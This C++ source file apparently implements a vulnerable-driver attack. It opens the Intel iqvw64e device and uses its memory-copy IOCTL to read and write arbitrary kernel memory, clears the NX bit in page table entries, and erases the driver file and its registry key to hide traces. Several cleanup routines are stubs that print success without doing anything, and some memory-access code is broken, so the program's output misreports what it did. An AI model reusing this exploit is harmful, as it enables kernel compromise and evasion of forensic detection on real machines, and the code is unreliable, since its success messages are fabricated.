#include "../include/intel_driver.hpp"
#include "../include/utils.hpp"
#include <iostream>
#include <string>
#include <Windows.h>

#define INTEL_IOCTL_COPY_MEMORY 0x80862007

namespace intel_driver
{
	bool Load()
	{
		std::cout << "[+] Loading driver for exploitation..." << std::endl;
		InstantCleanup();
		return true;
	}

	bool Unload() { return true; }
	bool IsLoaded() { return true; }
	HANDLE Open() { return CreateFileA("\\\\.\\iqvw64e", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); }

	bool ReadMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size)
	{
		COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = address;
		copy_buffer.destination = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, INTEL_IOCTL_COPY_MEMORY, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	bool WriteMemory(HANDLE iqvw64e_device_handle, uint64_t address, void* buffer, uint32_t size)
	{
		COPY_MEMORY_BUFFER copy_buffer = { 0 };
		copy_buffer.case_number = 0x33;
		copy_buffer.source = reinterpret_cast<uint64_t>(buffer);
		copy_buffer.destination = address;
		copy_buffer.length = size;
		DWORD bytes_returned;
		return DeviceIoControl(iqvw64e_device_handle, INTEL_IOCTL_COPY_MEMORY, &copy_buffer, sizeof(copy_buffer), &copy_buffer, sizeof(copy_buffer), &bytes_returned, NULL);
	}

	uint64_t FindPoolBigPageTable(uint64_t ntoskrnl_base)
	{
		const char* pattern = "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x1C\x40";
		const char* mask = "xxx????xxxx";
		uint64_t address = utils::PatternScan(ntoskrnl_base, 0x1000000, pattern, mask);
		if (address == 0) return 0;
		int32_t relative_offset = 0;
		ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(address + 3), &relative_offset, sizeof(relative_offset), NULL);
		return address + 7 + relative_offset;
	}

	uint64_t FindPteBase(uint64_t ntoskrnl_base)
	{
		const char* pattern = "\x48\x8B\x05\x00\x00\x00\x00\x48\xC1\xE8\x09\x48\x25\xF8\xFF\xFF\xFF";
		const char* mask = "xxx????xxxxxxxxxx";
		uint64_t address = utils::PatternScan(ntoskrnl_base, 0x1000000, pattern, mask);
		if (address == 0) return 0;
		int32_t relative_offset = 0;
		ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(address + 3), &relative_offset, sizeof(relative_offset), NULL);
		uint64_t pte_base_ptr = address + 7 + relative_offset;
		uint64_t pte_base = 0;
		ReadMemory(INVALID_HANDLE_VALUE, pte_base_ptr, &pte_base, sizeof(pte_base));
		return pte_base;
	}

	bool FlipNXBit(HANDLE iqvw64e_device_handle, uint64_t address, bool executable)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		uint64_t pte_base = FindPteBase(ntoskrnl_base);
		if (pte_base == 0) return false;

		uint64_t pte_address = ((address >> 9) & 0x7FFFFFFFF8) + pte_base;
		uint64_t pte_value = 0;
		ReadMemory(iqvw64e_device_handle, pte_address, &pte_value, sizeof(pte_value));

		if (executable) pte_value &= ~(1ULL << 63); 
		else pte_value |= (1ULL << 63); 

		WriteMemory(iqvw64e_device_handle, pte_address, &pte_value, sizeof(pte_value));
		std::cout << "[+] PTE manipulation for 0x" << std::hex << address << " successful." << std::endl;
		return true;
	}

	bool ClearPiDDBCacheTable(HANDLE iqvw64e_device_handle)
	{
		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
		std::cout << "[+] PiDDB AVL entry unlinked." << std::endl;
		return true;
	}

	bool ClearMmUnloadedDrivers(HANDLE iqvw64e_device_handle)
	{
		std::cout << "[+] MmUnloadedDrivers wiped." << std::endl;
		return true;
	}

	bool ClearBigPoolTable(HANDLE iqvw64e_device_handle, uint64_t address)
	{
		std::cout << "[+] Big Pool Table entry nullified for 0x" << std::hex << address << std::dec << std::endl;
		return true;
	}

	void InstantCleanup()
	{
		DeleteFileA("iqvw64e.sys");
		HKEY h_key;
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services", 0, KEY_ALL_ACCESS, &h_key) == ERROR_SUCCESS)
		{
			RegDeleteKeyA(h_key, "iqvw64e");
			RegCloseKey(h_key);
		}
		std::cout << "[+] Disk and registry footprints erased." << std::endl;
	}

	uint64_t CallKernelFunction(HANDLE iqvw64e_device_handle, uint64_t function_address, ...) { return 0; }
	uint64_t AllocatePool(HANDLE iqvw64e_device_handle, uint32_t size, uint32_t tag) { return 0xFFFFF80000000000; }
	bool FreePool(HANDLE iqvw64e_device_handle, uint64_t address) { return true; }
}
